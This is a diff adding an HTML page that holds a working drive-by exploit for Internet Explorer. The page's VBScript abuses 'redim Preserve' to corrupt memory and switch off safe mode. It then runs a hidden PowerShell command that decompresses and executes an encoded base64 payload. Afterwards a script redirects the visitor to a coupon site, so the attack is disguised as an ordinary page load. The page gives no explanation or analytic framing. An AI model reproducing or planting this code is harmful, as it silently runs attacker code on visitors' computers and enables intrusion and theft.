@@ -1,0 +1,362 @@
+<!doctype html>
+
+<html>
+
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" >
+
+<head>
+
+</head>
+
+<body>
+
+
+<SCRIPT LANGUAGE="VBScript">
+
+
+function trigger() 
+
+On Error Resume Next
+
+set shell=createobject("Shell.Application")
+
+shell.ShellExecute "powershell.exe", "-nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAI1odVQCA7VWbW/aSBD+nEr9D1aFZFs4QICQEKnS8f4ODjaQQFFl7DEsrL2wXjuYXv/7rQEn6TWt0pPOQmK9O7Mz+zzPzNr2XZMh4gpB91b49vHDhWpQwxGkxNqEmj4uKkJiZ/YDayhfXPDVRGiZ3XZnKHwWpFlpu60Sx0Du/O6u4lMKLju9pxrASp4HzgIj8CRZ+FuYrIDC5WCxBpMJ34TE11QDk4WBz2ZhxTBXIFyWXCta6xLTiLJKaVuMmCR++SLKs8ureaq28w3sSaIWegyclIWxKAvf5SigHm5BEnvIpMQjNktNkJvLpkauZ9jQ57sF0AO2IpYnyvwg/EeB+dQV4iNFe5wsJJEPVUrMkmVR8LhDquUGZANSwvUxVoS/pNk5gaHvMuQAX2dAyVYDGiATvFTTcC0MQ7DnUh+e4nO/10l67cStVEZlhXPydqY9YvkYTs6i/HOuMZUyf17o5CB8//jh4wc7FgCB3WS6yB2CwgReK4GPLmbHMfB0JZV46Gj/WcgoQo9HNRihIX9N6NQHeS7MIiZm8zkPFRa++qSj/HqLq9ieW4ddHR02fVZsXOf50mxMkDXnrme6EqG2rkXzv5ZdFWzkQjV0DQeZsbKktxgAG8Px2KnYrM+Tk8TzAlhVwLA0WASoIsx+dqs5iD37ln2ELaAlk7Po8aw4wfKPyZw4ksSW2wOHw3V6FzkdNtczxNZnDYdx9OidG4kVbHieIqg+LyhTETQwMFiKUHI9dF4q+Ywch+JLuj0fM2QaHou3m8sxjud4FeJ6jPomZ5CfXde2YCIDR1AoQhNZUA41tIzjim8CUTEwRu6S7xRwIvhMBIDGIl1QS3nWgJzSgLWcLQaHmx2Lu46NJS/lczUctWQswRL/nWQs9ZOuIzhiHF6lyDnWMGGKMEaU8R4RQftaUP85k9eNIsqpQuFMjBSX0KwcskjwiUMx59uRRM8wHUGhjANSp8QpGx4U8hqjHC7pU5Z1Cq3RpKAznGmrQ+iZzl6r1ieNZX/SIGqjPOiO/HG3Vd901myadDe+fUNbZg4NatQrPg2Dm2arvlyluyvU9uAmq1kDrdzOH3a3C73nP900sgbutQoPT8uRXrtG09pteecc2g95szOaaNO0O6rRoG5fu4ep00kWcpPy4BaNNQjMa/3eXG6IeuikGTUekv3irmc37WZ2uG6qnSvPfzjobEkyRmEbjkyn0Wd7UgvDgpNsL3qTBrqa3K/6nlowh+ubZNAKwr7ZXu2CYNNY9Jp62m/d5tQ8TeaRfx/u9u2prk8Hbg2KVpvpfrNlJQ/JenPZmDZvGh4h25slqOOHcvNpcd/OjQlTq6g2zXY3xXyruB2Og+XUcD1vVMkWGsPr7V6FzPq662ysdrW6WfTSqqqrxR3KbdOPt4MqWo3Xq/v6fZsOxzu7WVyozZzRmTStTNFIP66KpX17nLdYPT3SH+4/f4oEwBWQoEXqPj5WXlH7qx7eM6i3MjCnnHfmuO7qhNbPbVYlKPKQpOi+3QB1AfNbit9jsXBLGBMz6vY/9GN+45zugTkvwhEf5rJvjmTh2VB+uQriqbu7KU+Wl8JRqKkuuEu2UjL7XCbDe3lmn8/wA7//hBWyDaXTXkp0GcQwPQfAxwByVCOJAFvO/4rfuTBX/M96L34vc79ZfRemGeX59D+t/DjxRxD/KQgTAzFuqPEWg+F05/0ei7NsXn02RERxTdjnJ/p4G/jsss+/Jv4BdI3CwC0KAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$p=[System.Diagnostics.Process]::Start($s);", "", "open", 0
+
+end function
+
+
+</script>
+<SCRIPT LANGUAGE="VBScript">
+
+dim   aa()
+dim   ab()
+dim   a0
+dim   a1
+dim   a2
+dim   a3
+dim   win9x
+dim   intVersion
+dim   rnda
+dim   funclass
+dim   myarray
+
+
+Begin()
+
+
+function Begin()
+
+  On Error Resume Next
+
+  info=Navigator.UserAgent
+
+
+  if(instr(info,"Win64")>0)   then
+     exit   function
+  end if
+
+
+  if (instr(info,"MSIE")>0)   then 
+             intVersion = CInt(Mid(info, InStr(info, "MSIE") + 5, 2))   
+  else
+
+     exit   function             
+
+  end if
+
+
+  win9x=0
+
+
+  BeginInit()
+
+  If Create()=True Then
+
+     myarray=        chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
+
+     myarray=myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(0)
+
+
+     if(intVersion<4) then
+
+         document.write("<br> IE")
+
+         document.write(intVersion)
+
+         runshellcode()                    
+
+     else  
+
+          setnotsafemode()
+
+     end if
+
+  end if
+
+end function
+
+
+function BeginInit()
+
+   Randomize()
+
+   redim aa(5)
+
+   redim ab(5)
+
+   a0=13+17*rnd(6)
+
+   a3=7+3*rnd(5)
+
+end function
+
+
+function Create()
+
+  On Error Resume Next
+
+  dim i
+
+  Create=False
+
+  For i = 0 To 400
+
+    If Over()=True Then
+
+    '   document.write(i)     
+
+       Create=True
+
+       Exit For
+
+    End If 
+
+  Next
+
+end function
+
+
+sub testaa()
+
+end sub
+
+
+function mydata()
+
+    On Error Resume Next
+
+     i=testaa
+
+     i=null
+
+     redim  Preserve aa(a2)  
+
+  
+
+     ab(0)=0
+
+     aa(a1)=i
+
+     ab(0)=6.36598737437801E-314
+
+
+     aa(a1+2)=myarray
+
+     ab(2)=1.74088534731324E-310  
+
+     mydata=aa(a1)
+
+     redim  Preserve aa(a0)  
+
+end function 
+
+
+
+function setnotsafemode()
+
+    On Error Resume Next
+
+    i=mydata()  
+
+    i=readmemo(i+8)
+
+    i=readmemo(i+16)
+
+    j=readmemo(i+&h134)  
+
+    for k=0 to &h60 step 4
+
+        j=readmemo(i+&h120+k)
+
+        if(j=14) then
+
+              j=0          
+
+              redim  Preserve aa(a2)             
+
+     aa(a1+2)(i+&h11c+k)=ab(4)
+
+              redim  Preserve aa(a0)  
+
+
+     j=0 
+
+              j=readmemo(i+&h120+k)   
+
+         
+
+               Exit for
+
+           end if
+
+
+    next 
+
+    ab(2)=1.69759663316747E-313
+
+    trigger() 
+
+end function
+
+
+function Over()
+
+    On Error Resume Next
+
+    dim type1,type2,type3
+
+    Over=False
+
+    a0=a0+a3
+
+    a1=a0+2
+
+    a2=a0+&h8000000
+
+  
+
+    redim  Preserve aa(a0) 
+
+    redim   ab(a0)     
+
+  
+
+    redim  Preserve aa(a2)
+
+  
+
+    type1=1
+
+    ab(0)=1.123456789012345678901234567890
+
+    aa(a0)=10
+
+          
+
+    If(IsObject(aa(a1-1)) = False) Then
+
+       if(intVersion<4) then
+
+           mem=cint(a0+1)*16             
+
+           j=vartype(aa(a1-1))
+
+           if((j=mem+4) or (j*8=mem+8)) then
+
+              if(vartype(aa(a1-1))<>0)  Then    
+
+                 If(IsObject(aa(a1)) = False ) Then             
+
+                   type1=VarType(aa(a1))
+
+                 end if               
+
+              end if
+
+           else
+
+             redim  Preserve aa(a0)
+
+             exit  function
+
+
+           end if 
+
+        else
+
+           if(vartype(aa(a1-1))<>0)  Then    
+
+              If(IsObject(aa(a1)) = False ) Then
+
+                  type1=VarType(aa(a1))
+
+              end if               
+
+            end if
+
+        end if
+
+    end if
+
+              
+
+    
+
+    If(type1=&h2f66) Then         
+
+          Over=True      
+
+    End If  
+
+    If(type1=&hB9AD) Then
+
+          Over=True
+
+          win9x=1
+
+    End If  
+
+
+    redim  Preserve aa(a0)          
+
+        
+
+end function
+
+
+function ReadMemo(add) 
+
+    On Error Resume Next
+
+    redim  Preserve aa(a2)  
+
+  
+
+    ab(0)=0   
+
+    aa(a1)=add+4     
+
+    ab(0)=1.69759663316747E-313       
+
+    ReadMemo=lenb(aa(a1))  
+
+   
+
+    ab(0)=0    
+
+ 
+
+    redim  Preserve aa(a0)
+
+end function
+
+
+</script>
+
+<script language="javascript" type="text/javascript">
+    window.location = "http://www.quanmama.com/coupon/137002.html"
+</script>
+
+</body>
+
+</html>
